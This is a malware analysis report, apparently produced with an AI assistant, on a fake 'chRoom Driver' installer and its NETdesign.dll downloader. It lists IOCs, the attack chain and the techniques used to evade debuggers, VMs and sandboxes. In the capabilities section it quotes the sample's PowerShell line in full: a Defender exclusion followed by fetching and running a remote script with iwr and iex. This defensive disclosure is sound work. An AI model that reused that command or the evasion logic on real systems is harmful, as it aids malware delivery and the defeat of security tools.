# Malware Analysis Report: chRoom Driver.dll + NETdesign.dll

**Date:** 2026-06-02  
**Analyst:** REMnux / Claude  
**Sample:** chRoom Driver.dll (installer lure) + NETdesign.dll (payload)

---

## 1. File Metadata

### Primary Sample: chRoom Driver.dll

| Field | Value |
|---|---|
| **SHA256** | `d01b83a5646183712d1ec942699a8e0b034cef6d43388220e358cf125cd2e3bc` |
| **MD5** | `eaad7585e772232cac6fda975eed24de` |
| **SHA1** | `5ca8b3ba9be3f489615375f3c203b58359c12a3b` |
| **Size** | 1,097,728 bytes (1.05 MB) |
| **Type** | PE32+ x86-64 .NET 8.0 DLL (WinForms GUI) |
| **Sections** | `.text` (892 KB, RX), `.rsrc` (204 KB, R) |
| **Signing** | Unsigned |
| **PE Timestamp** | Forged (future date) |
| **VersionInfo** | CompanyName/ProductName/FileDescription: "chRoom Driver", v1.0.0.0 |
| **Framework** | .NET 8.0, Target: Windows 7.0+ |
| **UI Library** | Guna.UI2 v2.0.4.6 (custom WinForms widgets) |
| **Full Deployment** | `/home/remnux/malware/chRoom/` (complete .NET runtime + dependencies) |

### Companion Payload: NETdesign.dll

| Field | Value |
|---|---|
| **SHA256** | `31383f7fb86f483f02828a27800d621f15428666ea0f562649ff5e2403789d3c` |
| **MD5** | `ef6e3d2dc541c3c54edbd35e4e297963` |
| **SHA1** | `63c0d754241cbbfb5ffdcd4376c57b50bc824415` |
| **Size** | 50,688 bytes (49.5 KB) |
| **Type** | PE32 x86 .NET DLL (no exports) |
| **Sections** | `.text` (48 KB, RX), `.rsrc`, `.reloc` |
| **Signing** | Unsigned, no public key |
| **PE Timestamp** | Forged (future date) |
| **Obfuscator** | Obfuscar (confirmed by YARA + BigStaticArray + XorInLoop anomalies) |
| **String Encryption** | XOR: `decrypted[i] = data[i] ^ (i & 0xFF) ^ 0xAA`, 285 strings, 5,292-byte blob |

---

## 2. Classification

**Family:** Unattributed custom .NET loader/dropper with Telegram notification  
**Confidence:** High (fully decompiled; no family attribution)

**KesaKode online:** PandoraRAT 7.27% (chRoom Driver.dll), SystemShock 2.18% (NETdesign.dll) — both below the 20% attribution threshold; discarded.

This is a custom-built two-component package:
- `chRoom Driver.dll`: installer lure impersonating a **WebRTC/audio driver installer** for the real "chRoom" conference platform (chroom.cc)
- `NETdesign.dll`: the actual payload — a **staged downloader** with victim fingerprinting, AMSI bypass, screenshot exfiltration, and a Telegram-notified C2

The lure is polished (4-form wizard with progress bar, driver component selection UI, Guna.UI2 styling, links to real chroom.cc documentation). No certificate is present, which is the primary indicator of malice alongside the companion DLL.

---

## 3. Capabilities

### chRoom Driver.dll (Lure/Orchestrator)
- Multi-form WinForms installer wizard (4 screens: welcome → component select → progress → complete)
- Calls `RUN.upPermission()` (NETdesign) at **first form load** — before user clicks anything
- Launches `Program.RunMain()` (NETdesign) asynchronously behind the progress-bar animation
- Opens real chroom.cc documentation URLs when links are clicked (legitimacy theatre)
- On "Close": hides window, sleeps 20 seconds, then calls `Application.Exit()` — keeps payload running headless

### NETdesign.dll — `NETdesign.Plugin.RUN`
- **`upPermission()`**: If not admin, re-launches parent process with `ShellExecute("runas")` verb (UAC elevation prompt) then kills current non-elevated process. If already admin, calls `ExecDiskAsync()` directly.
- **`ByPassAMSI()`**: Runs `powershell.exe -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''; [System.Text.Encoding]::UTF8.GetString((iwr 'https://anon-connect[.]store/raw/js_plugin' -UseBasicParsing).Content) | iex"` — fetches and executes a remote PowerShell payload to patch AMSI in the PowerShell process
- **`ExecDiskAsync()`**: Executes the file at `A.A.A` path (current process path) — used for the UAC re-launch chain

### NETdesign.dll — `NETdesign.Plugin.Notifer.UpdaterNotife`
- **`RunAsync(launchName)`**: Run-once guard (checks AppData flag file); orchestrates notification + screenshot
- **`TitleNotificationAsync()`**: Collects full victim fingerprint and POSTs to C2
  - Fields collected: MachineName, username, external IP (ipify.org), country (ip-api.com), installed AVs (WMI `AntiVirusProduct`), OS (WMI `Win32_OperatingSystem`), locale, GPU model (WMI `Win32_VideoController`), current time, build/campaign name
  - Delivery format: Telegram-emoji-formatted message to `http://45[.]15[.]157[.]175:5001/send`
- **`TakeScreenshotAsync()`**: Captures desktop via `Graphics.CopyFromScreen` + `Screen.PrimaryScreen.Bounds`
- **`SendScreenshotWithInfoAsync()`**: POSTs screenshot PNG as `multipart/form-data` to `http://45[.]15[.]157[.]175:5001/send_photo` with `caption` field containing the system info message

### NETdesign.dll — `NETdesign.Finder.UpdaterFinder`
- **`StartProcess()`**: Iterates up to 5 download URLs, saves to one of 4 drop paths (Temp, UserProfile\Downloads, AppData, AppData\Local), verifies SHA256 integrity, executes downloaded file
- **`DownloadAndRunFile(fileUrl)`**: Resilient downloader with TLS 1.2, `Range:` header resume support, corruption detection + retry, multi-attempt with logging; sends per-attempt status to Telegram C2

### NETdesign.dll — `NETdesign.Protection`
- **`Antdeb.debCheck()`**: Checks running processes against a list of debugger tool names (x64dbg, x32dbg, OllyDbg, IDA Pro, WinDbg, Fiddler, Charles, dnSpy, Process Hacker, Process Explorer, Ghidra, etc.)
- **`Antvm.IsVM()`**: Checks GPU name list against VM GPU strings (VirtualBox, VMware, QEMU, Hyper-V, Parallels, KVM, Citrix, AWS, Azure, GCP, Oracle VirtualBox, Xen, Docker/Wine/emulators)
- **`Information.GetHWID()`**: Retrieves machine GUID; checks against a hardcoded blocklist of 30+ known sandbox HWIDs
- **Username/hostname blocklist**: 30+ known sandbox/VM usernames (WDAGUtilityAccount, Abby, Peter Wilson, JOHN-PC, LISA-PC, etc.) and 15+ known sandbox hostnames

---

## 4. Attack Chain

```
[Victim runs chRoom Driver.dll]
         │
         ▼
[FormOne_Load] ──► RUN.upPermission()
         │            ├── NOT admin: re-launch via runas (UAC prompt) → kill self
         │            └── IS admin: ExecDiskAsync() (no-op for re-launch)
         │
[User clicks Continue × 2]
         │
         ▼
[FormThree_Load]
    ├── timerNext.Start() → progress bar animation (UI only, 200ms ticks)
    └── await Program.RunMain() ──────────────────────────┐
                                                          │
[NETdesign.Program.RunMain()]                             │
    ├── GetInstalledAntivirusNames() (WMI)                │
    ├── IF Windows Defender present:                      │
    │       ├── ByPassAMSI():                             │
    │       │   └── PowerShell: Add-MpPreference +       │
    │       │       iex(anon-connect.store/raw/js_plugin) │
    │       └── ExecDiskAsync()                           │
    ├── UpdaterNotife.RunAsync(Config.launchName):        │
    │       ├── Check AppData run-once flag               │
    │       ├── TitleNotificationAsync()                  │
    │       │   └── POST sysinfo → 45.15.157.175:5001/send│
    │       ├── TakeScreenshotAsync()                     │
    │       └── SendScreenshotWithInfoAsync()             │
    │           └── POST screenshot → .../send_photo      │
    ├── Task.Delay(1000ms)                                │
    └── UpdaterFinder.StartProcess():                     │
            └── Download + exec Stage 2 from             │
                drivedrover.com/[1-5].php ◄───────────────┘

[FormFour opens] → "Complete" screen
[User clicks Close] → hide + 20s delay → Application.Exit()
```

---

## 5. IOCs

### Network — IP Addresses
| IP | Port | Role |
|---|---|---|
| `45[.]15[.]157[.]175` | 5001 | C2 relay (Flask/Telegram notification server) |

### Network — Domains
| Domain | Role |
|---|---|
| `drivedrover[.]com` | Stage 2 payload download server |
| `anon-connect[.]store` | AMSI bypass PowerShell payload host |
| `docs[.]chroom[.]cc` | Lure link destination (legitimate chroom.cc docs) |
| `api[.]ipify[.]org` | External IP lookup (victim fingerprint) |
| `ip-api[.]com` | Country geolocation (victim fingerprint) |

### Network — URLs
| URL | Role |
|---|---|
| `http://45[.]15[.]157[.]175:5001/send` | Telegram-relay notification endpoint |
| `http://45[.]15[.]157[.]175:5001/send_photo` | Telegram-relay screenshot upload endpoint |
| `https://drivedrover[.]com/1.php` | Stage 2 payload URL (attempt 1) |
| `https://drivedrover[.]com/2.php` | Stage 2 payload URL (attempt 2) |
| `https://drivedrover[.]com/3.php` | Stage 2 payload URL (attempt 3) |
| `https://drivedrover[.]com/4.php` | Stage 2 payload URL (attempt 4) |
| `https://drivedrover[.]com/5.php` | Stage 2 payload URL (attempt 5) |
| `https://anon-connect[.]store/raw/js_plugin` | AMSI bypass payload (fetched via `iwr`, executed via `iex`) |

### Filesystem
| Path | Description |
|---|---|
| `%TEMP%\<filename>` | Stage 2 drop location (primary) |
| `%USERPROFILE%\Downloads\<filename>` | Stage 2 drop location (fallback 1) |
| `%APPDATA%\<filename>` | Stage 2 drop location (fallback 2) |
| `%LOCALAPPDATA%\<filename>` | Stage 2 drop location (fallback 3) |
| `%APPDATA%\` (flag file check) | Run-once marker for notification (path checked via `File.Exists(AppData)`) |

### Process
| Indicator | Description |
|---|---|
| `powershell.exe -ExecutionPolicy Bypass -Command "..."` | AMSI bypass PowerShell spawned by NETdesign.dll |
| Re-launch of parent process with `runas` verb | UAC elevation attempt |

### Campaign Build Names (hardcoded config strings)
`FirstBuild`, `SecondBuild`, `DellBuild`, `MetaBuild`, `FlowBuild`

### Strings / Heuristics
| String | Significance |
|---|---|
| `Add-MpPreference -ExclusionPath ''` | WD exclusion command |
| `[System.Text.Encoding]::UTF8.GetString((iwr ... | iex` | Remote PS payload execution |
| `NETdesign.Plugin` | Payload assembly namespace |
| `chRoom_Driver.dll` / `NETdesign.dll` | Component names |
| `select * from Win32_VideoController` | VM GPU check query |
| `SELECT * FROM AntiVirusProduct` | AV enumeration query |
| `SELECT * FROM Win32_OperatingSystem` | OS fingerprint query |

---

## 6. Emulation Results

Speakeasy: Not supported for .NET assemblies. Skipped.

**String decryption (manual):** BigStaticArray at EA 23984 (5,292 bytes) in NETdesign.dll successfully decrypted using recovered key `data[i] ^ (i & 0xFF) ^ 0xAA`, yielding 285 plaintext strings including all C2 URLs, campaign names, AV/VM/sandbox blocklists, Telegram message templates, and PowerShell AMSI bypass commands. Full decrypted string blob saved to `/home/remnux/mal/output/NETdesign_staticarray.bin`.

---

## 7. Sandbox Results (ANY.RUN)

**chRoom Driver.dll:** Submission failed — plan limit exceeded (concurrent submission cap).

**NETdesign.dll:** Score 0/100 — "No threats detected"  
Task ID: `3e62dae0-33a0-41aa-9d9b-195cf28cf532`  
Public URL: `https://app.any.run/tasks/3e62dae0-33a0-41aa-9d9b-195cf28cf532`  
Tags: None. The 0/100 verdict is expected: NETdesign.dll has **no export table** (`DllNoExportTable` anomaly) — it cannot be called by the sandbox directly without the orchestrating `chRoom Driver.dll` loader. The sandbox executed an empty shell. This is effective evasion-by-design.

---

## 8. Analyst Notes

**What the C2 server at `45.15.157.175:5001` is:** The Flask API acts as a Telegram relay — it accepts POST requests with `message`/`application/json` from the implant and forwards them to a Telegram bot. The implant sends structured notifications rather than opening a direct Telegram connection (likely to avoid Telegram bot-token exposure in the binary, though `drivedrover.com` still serves the stage 2 payload directly). The relay server handles both text (`/send`) and photo+caption (`/send_photo`) endpoints.

**What the AMSI bypass does:** Fetching `anon-connect.store/raw/js_plugin` delivers an in-memory PowerShell payload (`iex`'d) that patches `AmsiScanBuffer` in the PowerShell process. This allows subsequent PowerShell-based activity (likely in Stage 2) to evade AMSI scanning. The `Add-MpPreference -ExclusionPath ''` call attempts to add an empty path exclusion, which may succeed depending on WD policy configuration.

**Stage 2 unknown:** `drivedrover.com` serves the Stage 2 payload via PHP endpoints (`/1.php`–`/5.php`). The Stage 2 is not available for static analysis — it is downloaded at runtime. Given the full fingerprinting pipeline (screenshot, GPU, AV, OS, country), the payload may be victim-filtered. The 5-URL fallback with resume/integrity-check logic suggests a sophisticated, monitored distribution infrastructure.

**Lure sophistication:** The "chRoom" brand is real (chroom.cc is a legitimate WebRTC meeting platform). The installer UI includes actual documentation links, version numbers, component names, and Guna.UI2 custom styling — considerably more effort than typical droppers. Likely targeting developers or IT staff involved with WebRTC/video conferencing infrastructure.

**Run-once behavior:** NETdesign checks `File.Exists(AppData)` before sending the notification. This prevents duplicate C2 registrations if the user runs the installer twice. However, Stage 2 download and execution is not guarded by the same flag — only the initial notification is deduplicated.

**Gaps:** Stage 2 payload content unknown. The `Config.launchName` value (one of `FirstBuild`/`SecondBuild`/`DellBuild`/`MetaBuild`/`FlowBuild`) is selected based on build configuration and was not determinable statically — the decoded string index depends on which method (`bn()`) maps to which campaign at runtime. Full Telegram bot account and channel are not exposed (only the relay server IP is visible).

**Attribution:** No confirmed family. The Obfuscar + Flask Telegram relay + multi-fallback PHP download pattern does not match previously analyzed samples in this workspace to the required evidence bar.
